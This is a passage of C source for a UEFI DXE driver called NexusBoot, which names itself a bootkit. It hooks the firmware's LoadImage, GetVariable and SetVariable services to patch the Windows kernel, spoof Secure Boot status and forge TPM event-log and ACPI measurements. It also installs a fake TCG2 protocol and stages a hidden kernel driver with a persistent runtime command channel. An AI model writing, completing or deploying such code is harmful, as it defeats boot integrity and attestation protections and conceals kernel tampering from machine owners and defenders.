		// kernels, which we no longer support at all. What remains: show the message unless we
		// deliberately refused an unsupported build, in which case PatchNtoskrnl already printed
		// a specific reason and a second generic banner adds nothing.
		CONST BOOLEAN ShowErrorMessage = Status != EFI_UNSUPPORTED;
		if (Status == EFI_SUCCESS)
		{
			SetConsoleTextColour(EFI_GREEN, TRUE);
			PrintKernelPatchInfo();
			Print(L"\r\nSuccessfully patched ntoskrnl.exe.\r\n");

			//
			// DEFERRED REPORTING -- these print LAST, immediately before the optional keypress.
			//
			// They were originally printed at the top of this callback, which is where the work
			// happens. That was wrong for a practical reason: the [PatchNtoskrnl] block below is
			// ~25 lines and the console SCROLLED them off the top, so two boots produced no
			// readable diagnostics at all. Printed here they are the last thing on screen, and
			// with WaitForKeyPress enabled the pause holds exactly them.
			//
			// The ACPI patch itself still runs at the top of the callback; only the report moved.
			// Timing of the work and placement of its output are separate concerns.
			//
			UINT32 HookCalls = 0, HookBytes = 0;
			EFI_STATUS HookStatus = EFI_NOT_READY;
			GetTcgHookDiagnostics(&HookCalls, &HookStatus, &HookBytes);
			Print(L"\r\n[TCG] GetEventLog hook: %u call(s), %r, %u bytes substituted\r\n",
				  HookCalls, HookStatus, HookBytes);
			Print(L"[TCG] ACPI in-place: %r, %u -> %u bytes (capacity %u)\r\n",
				  TcgAcpiStatus, mTcgOld, mTcgNew, mTcgCap);

			if (gDriverConfig.WaitForKeyPress)
			{
				Print(L"\r\nPress any key to continue.\r\n");
				WaitForKey();
			}
		}
		else if (ShowErrorMessage)
		{
			// Patch failed. Most important stuff first: make a fake BSOD, because... reasons
			// TODO if really bored: use GOP to set the BG colour on the whole screen.
			// Could add one of those obnoxious Win 10 :( smileys and a QR code
			gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLUE);
			gST->ConOut->ClearScreen(gST->ConOut);

			Print(L"A problem has been detected and Windows has been paused to prevent damage\r\nto your botnets.\r\n\r\n"
				L"BOOTKIT_KERNEL_PATCH_FAILED\r\n\r\n"
				L"Technical information:\r\n\r\n*** STOP: 0X%llX (%r, 0x%p)\r\n\r\n",
				Status, Status, gKernelPatchInfo.KernelBase);
			PrintKernelPatchInfo();

			// Give time for user to register their loss and allow for the grieving process to set in
			RtlStall(2000);

			// Prompt user to ask what they want to do
			Print(L"\r\nPress any key to continue anyway, or press ESC to reboot.\r\n");
			if (!WaitForKey())
			{
				gRT->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
			}
		}

		gST->ConOut->SetAttribute(gST->ConOut, OriginalAttribute);
		if (Status != EFI_SUCCESS && ShowErrorMessage)
			gST->ConOut->ClearScreen(gST->ConOut);
	}

	// If we do NOT need to survive ExitBootServices, clean up now: the image may then be freed after
	// this callback returns, which is what linking /SUBSYSTEM:EFI_BOOT_SERVICE_DRIVER would allow.
	// Staying resident requires /SUBSYSTEM:EFI_RUNTIME_DRIVER, because the image must not be freed.
	//
	// This is not a lifetime question about any one feature -- it decides whether the SetVariable
	// hook carrying the NEXUS_COMMAND channel survives ExitBootServices.
	if (!NEXUSBOOT_NEEDS_RUNTIME_CHANNEL || gBootmgfwHandle == NULL)
	{
		// Uninstall our installed driver protocols
		gBS->UninstallMultipleProtocolInterfaces(gImageHandle,
												&gNexusBootDriverProtocolGuid,
												&gNexusBootDriverProtocol,
												&gEfiDriverSupportedEfiVersionProtocolGuid,
												&gNexusBootSupportedEfiVersion,
												NULL);

		// Unregister SetVirtualAddressMap() notification
		if (gEfiVirtualNotifyEvent != NULL)
		{
			gBS->CloseEvent(gEfiVirtualNotifyEvent);
			gEfiVirtualNotifyEvent = NULL;
		}

		// Unhook gRT->SetVariable
		if (mOriginalSetVariable != NULL)
		{
			SetServicePointer(&gRT->Hdr, (VOID**)&gRT->SetVariable, (VOID*)mOriginalSetVariable);
			mOriginalSetVariable = NULL;
		}

		// Unhook gRT->GetVariable. This path only runs when we are NOT staying resident, so the
		// SB spoof is torn down with everything else -- Tier 1 requires the runtime driver.
		if (mOriginalGetVariable != NULL)
		{
			SetServicePointer(&gRT->Hdr, (VOID**)&gRT->GetVariable, (VOID*)mOriginalGetVariable);
			mOriginalGetVariable = NULL;
		}

	}

	// Regardless of which OS is being booted, boot services won't be available after this callback returns
	gBS = NULL;
	mOriginalLoadImage = NULL;
	gEfiAtRuntime = TRUE;
}

//
// SetVirtualAddressMap callback
//
VOID
EFIAPI
SetVirtualAddressMapEvent(
	IN EFI_EVENT Event,
	IN VOID* Context
	)
{
	ASSERT(gEfiAtRuntime == TRUE);
	ASSERT(gBS == NULL);
	gEfiVirtualNotifyEvent = NULL;

	// Convert the original SetVariable pointer to virtual so our hook will continue to work
	EFI_STATUS Status = gRT->ConvertPointer(0, (VOID**)&mOriginalSetVariable);
	ASSERT_EFI_ERROR(Status);

	//
	// Same for GetVariable (Tier 1 SB spoof). This conversion is what keeps the spoof alive
	// into Windows -- without it mOriginalGetVariable stays a PHYSICAL pointer and the first
	// runtime SecureBoot query jumps into unmapped memory.
	//
	// The ASSERT is deliberately kept for symmetry with the line above, but note it is a no-op
	// under MDEPKG_NDEBUG in RELEASE. There is no useful recovery here in any case: the hook is
	// already published in gRT, so a failed conversion is unrecoverable rather than a branch we
	// could take. ConvertPointer on a static in our own runtime image does not fail in practice.
	//
	Status = gRT->ConvertPointer(0, (VOID**)&mOriginalGetVariable);
	ASSERT_EFI_ERROR(Status);

	// Convert the runtime services pointer itself from physical to virtual
	Status = gRT->ConvertPointer(0, (VOID**)&gRT);
	ASSERT_EFI_ERROR(Status);

	// Set the flag indicating virtual addressing mode has been entered
	gEfiGoneVirtual = TRUE;

	/*
	 * Phase 3 reached. Recorded so that "SVAM never ran" stops being an inference drawn from the
	 * absence of its consequences -- which is how a boot failure got attributed to the wrong cause.
	 */
	NexusCoreSetBootFlag(NXC_BOOTFLAG_SVAM_FIRED);

	//
	// ===== SELF-RELOCATION (scope item 4c) -- MUST BE THE LAST THING THIS FUNCTION DOES =====
	//
	// The firmware relocates REGISTERED runtime images here. A manually-mapped image is not
	// registered, so if the Loader mapped us by hand we own this job. Skipping it means the first
	// runtime GetVariable call after Windows switches to virtual addressing jumps into an address
	// that no longer exists.
	//
	// ⚠ ORDER IS LOAD-BEARING, and this is the subtle part. Applying relocations rewrites every
	// absolute in-image address to its FUTURE virtual value -- while we are still executing at the
	// PHYSICAL one. Any of our globals holding an in-image pointer becomes unusable the instant this
	// runs. x64 code is largely RIP-relative so control flow survives, but nothing that reads such a
	// global can be trusted afterwards. Hence: all ConvertPointer work above, this last, and NOTHING
	// after it.
	//
	// Guarded on the Loader's explicit flag rather than anything inferred: relocating a LoadImage'd
	// image would apply the delta TWICE, which is equally fatal and equally invisible until it is
	// not. See the field docs in Include/Protocol/NexusBoot.h.
	//
	if (gDriverConfig.ManuallyMapped && mSelfImageBase != NULL && mSelfImageSize != 0)
	{
		UINT8* NewBase = mSelfImageBase;
		if (!EFI_ERROR(gRT->ConvertPointer(0, (VOID**)&NewBase)))
		{
			CONST INT64 Delta = (INT64)((UINT64)(UINTN)NewBase - (UINT64)(UINTN)mSelfImageBase);
			ApplyPeRelocations(mSelfImageBase, mSelfImageSize, Delta);
		}
	}

	//
	// PHASE 3 of the NexusCore map. Its image sits in EfiRuntimeServicesCode, so the firmware moves
	// it here exactly as it moves us, and it needs the same treatment for the same reason: nothing
	// registered it as a runtime image, so no one else will relocate it.
	//
	// MUST come AFTER our own self-relocation above. This function runs from our image, so relocating
	// ourselves first keeps the code executing correctly; NexusCore's image is inert data until the
	// armed one-shot calls into it, so ordering it second is safe. The reverse order is not.
	//
	// NexusCoreRelocateForVirtual() is a one-shot internally -- applying a delta twice corrupts every
	// absolute in the image, the same trap documented for our own 4c relocation.
	//
	NexusCoreRelocateForVirtual();
}

EFI_STATUS
EFIAPI
DriverConfigure(
	IN CONST NEXUSBOOT_CONFIGURATION_DATA* ConfigurationData
	)
{
	// Do not allow configure if we are at runtime, or if the Windows boot manager has been loaded
	if (gEfiAtRuntime || gBootmgfwHandle != NULL)
		return EFI_ACCESS_DENIED;

	if (ConfigurationData == NULL)
		return EFI_INVALID_PARAMETER;

	gDriverConfig = *ConfigurationData;

	Print(L"Configuration data accepted.\r\n\r\n");

	return EFI_SUCCESS;
}

//
// Driver unload
//
EFI_STATUS
EFIAPI
NexusBootUnload(
	IN EFI_HANDLE ImageHandle
	)
{
	// Do not allow unload if we are at runtime, or if the Windows boot manager has been loaded
	if (gEfiAtRuntime || gBootmgfwHandle != NULL)
	{
		return EFI_ACCESS_DENIED;
	}

	ASSERT(gBS != NULL);

	// Uninstall our installed driver protocols
	gBS->UninstallMultipleProtocolInterfaces(gImageHandle,
											&gNexusBootDriverProtocolGuid,
											&gNexusBootDriverProtocol,
											&gEfiDriverSupportedEfiVersionProtocolGuid,
											&gNexusBootSupportedEfiVersion,
											NULL);

	// Unregister SetVirtualAddressMap() notification
	if (gEfiVirtualNotifyEvent != NULL)
	{
		gBS->CloseEvent(gEfiVirtualNotifyEvent);
		gEfiVirtualNotifyEvent = NULL;
	}

	// Unregister ExitBootServices() notification
	if (gEfiExitBootServicesEvent != NULL)
	{
		gBS->CloseEvent(gEfiExitBootServicesEvent);
		gEfiExitBootServicesEvent = NULL;
	}

	// Unhook gRT->SetVariable
	if (mOriginalSetVariable != NULL)
	{
		SetServicePointer(&gRT->Hdr, (VOID**)&gRT->SetVariable, (VOID*)mOriginalSetVariable);
		mOriginalSetVariable = NULL;
	}

	// Unhook gRT->GetVariable
	if (mOriginalGetVariable != NULL)
	{
		SetServicePointer(&gRT->Hdr, (VOID**)&gRT->GetVariable, (VOID*)mOriginalGetVariable);
		mOriginalGetVariable = NULL;
	}

	// Unhook gBS->LoadImage
	if (mOriginalLoadImage != NULL)
	{
		SetServicePointer(&gBS->Hdr, (VOID**)&gBS->LoadImage, (VOID*)mOriginalLoadImage);
		mOriginalLoadImage = NULL;
	}

	return EFI_SUCCESS;
}

// 
// Main entry point
// 
EFI_STATUS
EFIAPI
NexusBootInitialize(
	IN EFI_HANDLE ImageHandle,
	IN EFI_SYSTEM_TABLE *SystemTable
	)
{
	ASSERT(ImageHandle == gImageHandle);

	// Check if we're not already loaded.
	NEXUSBOOT_DRIVER_PROTOCOL* NexusBootDriverProtocol;
	EFI_STATUS Status = gBS->LocateProtocol(&gNexusBootDriverProtocolGuid,
											NULL,
											(VOID**)&NexusBootDriverProtocol);
	if (Status != EFI_NOT_FOUND)
	{
		Print(L"An instance of the driver is already loaded.\r\n");
		return EFI_ALREADY_STARTED;
	}

	//
	// Install supported EFI version protocol
	//
	Status = gBS->InstallMultipleProtocolInterfaces(&gImageHandle,
													&gEfiDriverSupportedEfiVersionProtocolGuid,
													&gNexusBootSupportedEfiVersion,
													NULL);
	if (EFI_ERROR(Status))
	{
		Print(L"Failed to install EFI Driver Supported Version protocol. Error: %llx (%r)\r\n", Status, Status);
		return Status;
	}

	//
	// Query the console input handle for the Simple Text Input Ex protocol
	//
	gBS->HandleProtocol(gST->ConsoleInHandle, &gEfiSimpleTextInputExProtocolGuid, (VOID **)&gTextInputEx);

	//
	// Install NexusBoot driver protocol
	//
	Status = gBS->InstallProtocolInterface(&gImageHandle,
											&gNexusBootDriverProtocolGuid,
											EFI_NATIVE_INTERFACE,
											&gNexusBootDriverProtocol);
	if (EFI_ERROR(Status))
		goto Exit;

	//
	// Clear screen and print header
	//
	CONST INT32 OriginalAttribute = SetConsoleTextColour(EFI_GREEN, TRUE);
	Print(L"\r\n\r\n");
	Print(L"%S", NEXUSBOOT_TITLE1);
	Print(L"%S", NEXUSBOOT_TITLE2);
	gST->ConOut->SetAttribute(gST->ConOut, OriginalAttribute);

	//
	// Consume the one-shot boot-control variable. Placed HERE, immediately under the banner and
	// long before anything is patched, for two reasons: the message has to be on screen where it
	// will actually be read, and GetVariable has to run before HookedGetVariable is installed so
	// it reads the firmware rather than our own spoof.
	//
	ConsumeBootControl();

	EFI_LOADED_IMAGE_PROTOCOL *LocalImageInfo;
	//
	// Cache our own base/size for possible self-relocation at SetVirtualAddressMap (4c).
	//
	{
		EFI_LOADED_IMAGE_PROTOCOL* SelfImage = NULL;
		if (!EFI_ERROR(gBS->HandleProtocol(gImageHandle, &gEfiLoadedImageProtocolGuid,
										   (VOID**)&SelfImage)) && SelfImage != NULL)
		{
			mSelfImageBase = (UINT8*)SelfImage->ImageBase;
			mSelfImageSize = (UINTN)SelfImage->ImageSize;

			//
			// (ABI 15) WHICH DXE is running -- our own PE TimeDateStamp, read from our own headers.
			//
			// PayloadIdent does NOT answer this: it is the SHA-256 of the embedded NexusCore.sys, so
			// a DXE-only change leaves it identical. Proven by the DSE removal earlier today, where
			// the driver was byte-for-byte the same and "did my deploy take" became unanswerable for
			// exactly the class of change that has no other visible effect.
			//
			// Read HERE, at entry, before the SVAM self-relocation moves the image -- the base is
			// known-good at this point and there is no ordering question later.
			//
			// ⚠ READ here, PUBLISH later. The boot block does not exist yet -- NexusCoreReserve()
			// allocates it further down -- so calling NexusCoreSetDxeIdent() at this point writes
			// into a NULL mBootBlock and is silently dropped. That is exactly what shipped, and the
			// symptom was a status read reporting "DXE predates ABI 15" while announcing abi 15.
			//
			// Same ordering trap as the phase flags that were set before `BootFlags = 0` wiped them.
			// Stashed in a static instead of restructuring, so the READ keeps its useful property:
			// it happens at entry, from a base that is known-good and not yet moved by SVAM.
			CONST EFI_IMAGE_DOS_HEADER* CONST Dos = (CONST EFI_IMAGE_DOS_HEADER*)mSelfImageBase;
			if (Dos != NULL && Dos->e_magic == EFI_IMAGE_DOS_SIGNATURE)
			{
				CONST EFI_IMAGE_NT_HEADERS64* CONST Nt =
					(CONST EFI_IMAGE_NT_HEADERS64*)(mSelfImageBase + Dos->e_lfanew);
				if (Nt->Signature == EFI_IMAGE_NT_SIGNATURE)
					mDxeIdent = Nt->FileHeader.TimeDateStamp;
			}
		}
	}

	Status = gBS->OpenProtocol(gImageHandle,
								&gEfiLoadedImageProtocolGuid,
								(VOID**)&LocalImageInfo,
								gImageHandle,
								NULL,
								EFI_OPEN_PROTOCOL_GET_PROTOCOL);
	if (EFI_ERROR(Status))
		goto Exit;

	PrintLoadedImageInfo(LocalImageInfo);

	//
	// Hook gBS->LoadImage
	//
	mOriginalLoadImage = (EFI_IMAGE_LOAD)SetServicePointer(&gBS->Hdr, (VOID**)&gBS->LoadImage, (VOID*)&HookedLoadImage);
	//
	// ⚠ THE FLAG IS **NOT** SET HERE, AND THE COMMENT 30 LINES ABOVE SAYS WHY.
	//
	// NexusCoreReserve() allocates the boot block FURTHER DOWN, so mBootBlock is still NULL at this
	// point and NexusCoreSetBootFlag() drops the write silently. Setting it here shipped for exactly
	// one boot and produced a trail that CONTRADICTED ITSELF:
	//
	//     [ ] gBS->LoadImage hooked
	//     [x] bootmgfw.efi SEEN by the hook      <-- cannot happen without the hook
	//
	// SEEN is written from inside HookedLoadImage, by which time the block exists, so it survived
	// while its own precondition appeared false. The self-contradiction is what made it obvious.
	//
	// So HOOKED is now set at the TOP of HookedLoadImage -- see there. That also makes it mean
	// something strictly better: "the hook actually RAN", not "we called SetServicePointer".
	//
	Print(L"Hooked gBS->LoadImage: 0x%p -> 0x%p\r\n", (VOID*)mOriginalLoadImage, (VOID*)&HookedLoadImage);

	//
	// Hook gRT->SetVariable
	//
	mOriginalSetVariable = (EFI_SET_VARIABLE)SetServicePointer(&gRT->Hdr, (VOID**)&gRT->SetVariable, (VOID*)&HookedSetVariable);
	Print(L"Hooked gRT->SetVariable: 0x%p -> 0x%p\r\n", (VOID*)mOriginalSetVariable, (VOID*)&HookedSetVariable);

	//
	// Hook gRT->GetVariable (Tier 1 SB spoof). Installed unconditionally rather than under
	// `if (gDriverConfig.SpoofSecureBoot)`, because Configure() may not have run yet -- the
	// Loader calls it after the driver has loaded. HookedGetVariable re-checks the flag on every
	// call, so toggling it off leaves an inert pass-through rather than a stale spoof.
	//
	mOriginalGetVariable = (EFI_GET_VARIABLE)SetServicePointer(&gRT->Hdr, (VOID**)&gRT->GetVariable, (VOID*)&HookedGetVariable);
	Print(L"Hooked gRT->GetVariable: 0x%p -> 0x%p\r\n", (VOID*)mOriginalGetVariable, (VOID*)&HookedGetVariable);

	//
	// Tier 3 of the SB spoof, ARM ONLY. This resolves the ACPI TPM2 table and reserves its work
	// buffer now, because both become impossible later: ACPI hands out PHYSICAL addresses that are
	// only valid while identity-mapped, and allocation is forbidden inside the ExitBootServices
	// callback where the actual patch runs.
	//
	InitTcgLogSanitizer();

	//
	// ⚠ THE platformAuth PROBE IS DELIBERATELY NOT CALLED. ANSWERED.
	//
	//     TPM2_PolicySecret(TPM_RH_PLATFORM, empty auth) -> rc 0x9A2
	//     = TPM_RC_BAD_AUTH (E=0x22) on session 1
	//
	// Firmware randomises platformAuth EARLIER than this point -- plausibly right after
	// TPM2_Startup in PEI, which is inside the firmware and behind Boot Guard, so there is no
	// earlier place we can run. Rewriting the EK certificate NV index is therefore closed from
	// the DXE exactly as it is from Windows, and TPM identity work belongs to the hypervisor
	// (phase 6), which is the only approach that has ever worked on this machine.
	//
	// Left in the tree, not called: the implementation and its reasoning are the reference for
	// phase 6, and re-arming it is one line if a firmware update ever makes the question live
	// again. Calling it every boot would spend three TPM commands and one failed
	// platform-hierarchy authorisation per boot to re-derive an answer we already have.
	//
	// See the design notes section 10.
	//

	//
	// PHASE 1 of the NexusCore map, for the same reason InitTcgLogSanitizer() runs here: this is
	// the last point where allocation is legal. Winload's protected-mode context (where phase 2
	// binds it to the kernel) cannot allocate at all.
	//
	// Verifies the embedded payload's SHA-256 before reserving anything, so a stale or truncated
	// embed fails HERE with a status rather than becoming an unexplained early-boot hang -- the
	// most expensive failure mode available to us, since each diagnosis costs a reboot cycle.
	//
	{
		CONST EFI_STATUS CoreStatus = NexusCoreReserve();
		if (EFI_ERROR(CoreStatus))
		{
			// Non-fatal by design: boot normally without NexusCore rather than not at all.
			Print(L"[NexusBootDxe] NexusCore reserve FAILED: 0x%llX%s\r\n", (UINT64)CoreStatus,
			      CoreStatus == EFI_CRC_ERROR ? L" (payload digest mismatch -- re-run tools/embed_driver.py)" : L"");
		}
		else
		{
			Print(L"[NexusBootDxe] NexusCore staged, boot block at 0x%llX\r\n",
			      (UINT64)(UINTN)NexusCoreGetBootBlock());

			// PUBLISH the DXE ident now that the block exists. Read at entry (see mDxeIdent), but
			// it could not be written until here -- the setter is NULL-safe and silently drops
			// writes before reserve, which is precisely how the first version shipped broken.
			NexusCoreSetDxeIdent(mDxeIdent);
		}
	}

	//
	// PHASE 1.2 -- the software TPM RAM CRB transport (region A) and canonical state (region B).
	//
	// Placed HERE for the same reason as NexusCoreReserve() and InitTcgLogSanitizer() directly
	// above: this is the last point in the boot where allocation is legal. Both regions are
	// EfiACPIMemoryNVS so they survive ExitBootServices, which is the whole point -- state the DXE
	// builds must still be readable when the OS starts asking.
	//
	// NON-FATAL by design, exactly like the NexusCore reserve: a machine that cannot allocate the
	// transport should still boot. Phase 1 is a measurement phase, and a boot we cannot complete
	// measures nothing.
	//
	{
		EFI_PHYSICAL_ADDRESS TpmTransport = 0, TpmState = 0;
		UINT64 TpmEpoch = 0;
		CONST EFI_STATUS TpmStatus = NexusTpmTransportInit(&TpmTransport, &TpmState, &TpmEpoch);
		if (EFI_ERROR(TpmStatus))
		{
			Print(L"[TPM] transport init FAILED: %r -- booting without it\r\n", TpmStatus);
		}
		else
		{
			//
			// PHASE 1.3 -- publish the ACPI TPM2 table so the transport is DISCOVERABLE.
			//
			// Only on a successful transport init: a table advertising a control area that was
			// never allocated would point Windows at whatever happens to live at address 0x40,
			// which is strictly worse than publishing nothing.
			//
			// Also non-fatal. A machine that cannot publish the table should still boot; we
			// simply learn that this firmware exposes no EFI_ACPI_TABLE_PROTOCOL, which is
			// itself a Phase 1.3 result.
			//
			//
			// ABI 17 -- hand both regions and the epoch to ring 0 BEFORE publishing anything.
			//
			// Nothing else carries these across ExitBootServices, and `readphys` refuses both until
			// it knows their extents: EfiACPIMemoryNVS is not in Windows' system RAM map, so the
			// guard cannot tell our own DRAM from device MMIO without being told.
			//
			// Sizes are the page counts the transport actually allocated, taken from the same
			// constants rather than restated here -- a second copy of a size is a second thing to
			// get wrong.
			//
			NexusCoreSetTpmRegions(TpmTransport, NexusTpmTransportSizeA(),
			                       TpmState,     NexusTpmTransportSizeB(),
			                       TpmEpoch);

			NexusTpmAcpiPublish(TpmTransport);

			//
			// PHASE 1.3b -- and the device node, because 1.3 MEASURED that the table alone
			// binds nothing. Ordered after the table: both are independent installs, but the
			// boot output reads in the order a reader expects (what we advertise, then what
			// advertises it).
			//
			NexusTpmSsdtPublish(TpmTransport);

			//
			// Measurement only. Answers whether the firmware offers a TPM to the BOOT LOADER at
			// all -- which the evidence now says matters more than anything in the CRB.
			//
			NexusCoreSetFirmwareTcg(NexusTpmProbeFirmwareTcg());

			//
			// PHASE 2 -- publish EFI_TCG2_PROTOCOL ourselves.
			//
			// (!) THIS IS THE MEASURED BLOCKER, not a guess. The probe above reports that the
			// firmware offers NO TCG facilities at all, so the boot loader has never had a TPM to
			// measure into -- which is why tpm.sys binds our ACPI device and then never writes a
			// byte to the CRB. Four reboots went into the CRB before the evidence pointed here.
			//
			// (!) ORDERED AFTER THE PROBE ON PURPOSE. The probe must report what the FIRMWARE
			// publishes; running it after we install would report our own protocol back to us and
			// quietly destroy the measurement that justified writing this.
			//
			// Installed here rather than later because bootmgfw is loaded after this entry
			// returns, and a protocol the loader cannot see when it looks is no protocol at all.
			//
			NexusTcg2Install(TpmState, NexusTpmTransportSizeB());

			//
			// ABI 19 -- publish the log extent so the OS side can read the entry COUNT.
			//
			// (!) THIS IS THE ONLY WAY TO ANSWER THE QUESTION THIS BUILD EXISTS TO ASK. Whether the
			// loader measured through us cannot be read from TpmPresent or the MeasuredBoot log --
			// both are downstream of G1, and both say "no TPM" whether the loader called us or not.
			// The log entry count is a direct observation: 1 means only our own header event is
			// there, more means the loader added entries.
			//
			// Called AFTER the install, not before: the log does not exist until then.
			//
			{
				UINT64 LogBase = 0;
				NexusTcg2GetState(&LogBase, NULL, NULL);
				NexusCoreSetTpmEventLog(LogBase, NexusTcg2LogSize());
			}
		}
	}

	//
	// DIAGNOSTIC, remove once 4c is decided: report whether our hooked gRT entries are
	// distinguishable by memory-region from the untouched ones. Called HERE because both hooks are
	// already installed, so the table shows its final state.
	//
	// MEASURED: all six gRT entries, ours and the firmware's, share ONE memory region on the
	// final map, so a hooked pointer is NOT distinguishable from an untouched one by range.

	// Register notification callback for ExitBootServices()
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL,
								TPL_NOTIFY,
								ExitBootServicesEvent,
								NULL,
								&gEfiEventExitBootServicesGuid,
								&gEfiExitBootServicesEvent);
	if (EFI_ERROR(Status))
		goto Exit;

	// Register notification callback for SetVirtualAddressMap()
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL,
								TPL_NOTIFY,
								SetVirtualAddressMapEvent,
								NULL,
								&gEfiEventVirtualAddressChangeGuid,
								&gEfiVirtualNotifyEvent);
	if (EFI_ERROR(Status))
		goto Exit;

	// Initialize the global kernel patch info struct.
	gKernelPatchInfo.Status = EFI_SUCCESS;
	gKernelPatchInfo.BufferSize = 0;
	SetMem64(gKernelPatchInfo.Buffer, sizeof(gKernelPatchInfo.Buffer), 0ULL);
	gKernelPatchInfo.KernelBuildNumber = 0;
	gKernelPatchInfo.KernelBase = NULL;

	// The ASCII banner is very pretty - ensure the user has enough time to admire it
	RtlSleep(1500);

Exit:
	if (EFI_ERROR(Status))
	{
		Print(L"\r\nNexusBootDxe initialization failed with status %llx (%r)\r\n", Status, Status);

		// Because we do not use the driver binding protocol, recovering from a failed load is simple.
		// We can just call the unload function, which will only unload that which was actually installed.
		NexusBootUnload(gImageHandle);
	}
	return Status;
}
